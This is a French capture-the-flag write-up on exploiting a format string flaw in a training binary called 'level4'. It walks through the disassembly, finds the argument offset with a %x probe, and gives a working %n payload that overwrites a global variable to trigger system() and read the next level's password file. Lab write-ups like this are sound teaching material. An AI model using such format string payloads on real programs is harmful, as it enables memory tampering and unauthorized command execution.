# RAPPORT — Exploitation d’une **Format String** (level4)

## 1. Contexte général

Le binaire `level4` reprend une structure très proche du level3 :

* Lecture d’une entrée utilisateur via `fgets` dans un **buffer local (stack)**.
* Passage de ce buffer à une fonction `p` qui appelle **`printf(buffer)`** (format string contrôlé).
* Vérification d’une **variable globale** à une adresse fixe, puis appel à `system()` si elle vaut une constante.

Objectif :

> Forcer l’égalité sur la variable comparée afin de déclencher l’appel à `system` et lire `/home/user/level5/.pass`.

---

## 2. Analyse statique (GDB)

### 2.1 Fonction `main`

```asm
0x080484a7 <+0>:  push   %ebp
0x080484a8 <+1>:  mov    %esp,%ebp
0x080484aa <+3>:  and    $0xfffffff0,%esp
0x080484ad <+6>:  call   0x8048457 <n>
0x080484b2 <+11>: leave
0x080484b3 <+12>: ret
```

`main` ne fait qu’appeler `n()`.

---

### 2.2 Fonction `n`

```asm
0x0804845a <+3>:  sub    $0x218,%esp

0x08048471 <+26>: lea    -0x208(%ebp),%eax
0x0804847a <+35>: call   fgets@plt

0x0804847f <+40>: lea    -0x208(%ebp),%eax
0x08048488 <+49>: call   p

0x0804848d <+54>: mov    0x8049810,%eax
  0x08048492 <+59>: cmp    $0x1025544,%eax
  0x08048497 <+64>: jne    0x80484a5 <n+78>
  0x08048499 <+66>: movl   $0x8048590,(%esp)
  0x080484a0 <+73>: call   system@plt
```

Points clés :

* Buffer local à `EBP - 0x208`, taille de lecture `0x200` (512 bytes) via `fgets`.
* Appel `p(buffer)`.
* Lecture de la **variable globale** à l’adresse `0x8049810`.
* Comparaison avec `0x01025544` (hex) = **16930116** (déc).
* Si égal → `system(0x8048590)`.

---

### 2.3 Fonction `p`

```asm
0x0804844a <+6>:  mov    0x8(%ebp),%eax
0x0804844d <+9>:  mov    %eax,(%esp)
0x08048450 <+12>: call   printf@plt
```

Vulnérabilité :

> `printf` est appelé avec **un seul argument** : le buffer utilisateur.
>
> Donc `printf(buffer)` au lieu de `printf("%s", buffer)` → **format string** exploitable.

---

## 3. Stratégie d’exploitation

Le contrôle de format string permet d’utiliser `%n` :

* `%n` écrit en mémoire le nombre de caractères déjà imprimés, à l’adresse donnée en argument.
* Comme `printf` n’a pas d’arguments supplémentaires explicites, on doit **faire pointer un des “arguments” récupérés sur la stack** vers une adresse qu’on place nous-même dans l’input.

Plan :

1. Mettre en début d’input l’adresse cible `0x8049810` (en little-endian).
2. Repérer à quel index d’arguments `printf` va considérer que cette adresse est un de ses paramètres (via `%x`).
3. Utiliser `%<index>$n` pour écrire dans `0x8049810`.
4. Ajuster le padding pour que le compteur imprimé soit exactement `16930116`.

---

## 4. Trouver l’offset (position de l’adresse dans la “stack vue par printf”)

Payload de reconnaissance :

```bash
(python -c "print 'AAAA' + '%x.'*20"; cat) | ./level4
```

Sortie observée (extrait significatif) :

```
...
41414141
...
```

`0x41414141` correspond à `AAAA`.

Dans mon cas, `41414141` apparaît en **12ᵉ position** → l’adresse que je place en tête (ou les marqueurs) est consommée par `printf` comme **12ᵉ argument**.

Conclusion :

> J’utilise `%12$n`.

---

## 5. Écriture de la valeur attendue avec `%n`

### 5.1 Adresse cible

Variable comparée :

* Adresse : `0x8049810`
* À écrire : `0x01025544` = **16930116**

Adresse en little-endian :

* `0x08049810` → `\x10\x98\x04\x08`

---

### 5.2 Construction du payload

Je mets l’adresse cible au début (4 bytes), puis “j’imprime” assez de caractères pour que le compteur atteigne **16930116**, puis `%12$n`.

Comme les 4 octets de l’adresse sont déjà “comptés” comme caractères émis par `printf` (ils sont présents dans la chaîne), je fais :

* padding = `16930116 - 4` = **16930112**

Payload final :

```bash
(python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'; cat) | ./level4
```

Effet :

* `printf` traite `\x10\x98\x04\x08` comme un argument (12ᵉ).
* `%16930112d` force l’impression d’un champ très large → le compteur de caractères devient 16930112 + 4 = 16930116.
* `%12$n` écrit 16930116 à l’adresse `0x8049810`.
* La comparaison réussit → `system()` est appelée.

---

## 6. Récupération du flag

Une fois `system()` déclenché (souvent un `cat ...` ou un shell selon la chaîne), je récupère le mot de passe du niveau suivant :

```bash
cat /home/user/level5/.pass
```

Puis :

```bash
su level5
```

---

## 7. Schéma de pile (vision “printf”)

Même si `p()` ne passe qu’un paramètre (`buffer`), `printf` va quand même lire des “arguments” successifs sur la stack quand on utilise `%x`, `%n`, etc.

Schéma simplifié lors de l’appel dans `p` :

```
p():
  push ebp
  mov  ebp, esp
  sub  esp, 0x18

  eax = [ebp+8]          -> pointeur vers buffer (stack de n)
  [esp] = eax            -> printf(buffer)

printf():
  format = buffer
  lit des "arguments" à la suite dans la stack quand on demande %x / %n
  ...
```

Et dans `n()`, mon buffer `-0x208(%ebp)` contient :

```
[ 0x08049810 ][ "%16930112d%12$n" ... ]
^
adresse placée dans mon input, retrouvée ensuite comme “argument” n°12 par printf
```

---

---

## 9. Synthèse finale

* La faille vient de `printf(buffer)` → format string.
* Je place l’adresse de la variable globale (`0x8049810`) dans l’input.
* Je repère que cette adresse correspond au **12ᵉ argument** (`%12$...`) via `%x`.
* J’utilise `%n` pour écrire **16930116** (0x01025544) dans la variable.
* La condition est vraie → `system()` s’exécute → récupération du flag.
